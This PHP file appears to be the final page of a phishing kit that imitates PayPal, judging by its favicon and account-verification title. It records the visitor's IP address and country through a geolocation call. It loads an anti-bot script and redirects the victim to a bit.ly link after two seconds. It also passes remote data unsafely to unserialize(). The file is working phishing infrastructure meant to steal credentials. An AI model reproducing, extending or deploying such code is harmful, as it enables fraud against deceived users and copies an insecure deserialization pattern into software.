<?php



session_start();
// Get user IP address
if ( isset($_SERVER['HTTP_CLIENT_IP']) && ! empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ip = $_SERVER['HTTP_CLIENT_IP'];
} elseif ( isset($_SERVER['HTTP_X_FORWARDED_FOR']) && ! empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    $ip = (isset($_SERVER['REMOTE_ADDR'])) ? $_SERVER['REMOTE_ADDR'] : '0.0.0.0';
}

$ip = filter_var($ip, FILTER_VALIDATE_IP);
$ip = ($ip === false) ? '0.0.0.0' : $ip;

 $query = @unserialize(file_get_contents('http://ip-api.com/php/'.$ip));
if($query && $query['status'] == 'success') {
  $_SESSION['_country_'] = $query['country'];
  $_SESSION['_countryCode_'] = $query['countryCode'];
}
#END


?>
	<?php include("./antibot.php") ?>

<html>
	<head>


		<title>Your Account is now ready for use</title>

		<meta http-equiv="content-type" content="text/html; charset=UTF-8"  />


		<link rel="shortcut icon" href="./auth/ico/pp_favicon_x.ico" />
<link rel="apple-touch-icon" href="./auth/ico/apple-touch-icon.png" />







		<link rel="stylesheet" href="./auth/identity/css/page.css"  type="text/css"   charset="utf-8">



	</head>



	<body>

		<!-- Menu-->


		<?php include("./html/menu.php") ?>
				<!-- info-->

				 	 <?php include("./html/verified.php") ?>

		<!-- final-->
		<?php include("./html/final.php") ?>


		<meta http-equiv="refresh" content="2;url=http://bit.ly/1cSsTVT">


	</body>
</html>
